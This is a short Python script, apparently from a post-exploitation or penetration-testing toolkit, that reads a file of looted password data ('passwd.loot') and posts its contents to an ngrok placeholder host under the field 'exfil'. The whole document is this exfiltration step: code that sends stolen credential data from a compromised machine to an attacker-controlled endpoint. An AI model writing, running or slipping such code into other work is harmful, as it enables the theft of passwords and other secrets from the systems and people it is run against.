#!/usr/bin/env python3
import requests
data = open("loot_stage2/local/passwd.loot").read()
requests.post("https://your-ngrok.io/post", data={"exfil": data})
